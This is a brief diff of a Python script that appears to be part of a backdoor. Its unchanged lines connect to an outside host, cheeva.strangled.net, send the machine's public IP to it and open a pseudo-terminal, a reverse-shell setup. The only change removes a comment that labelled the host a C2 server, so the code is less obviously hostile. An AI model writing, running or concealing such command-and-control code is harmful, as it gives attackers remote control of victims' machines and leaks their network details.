@@ -53,7 +53,6 @@ def main():
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect(("cheeva.strangled.net", 80))
             
-            # Instantly pass the public IP string to the C2 server
             s.send(f"{true_ip}\n".encode())
             
             master, slave = os.openpty()
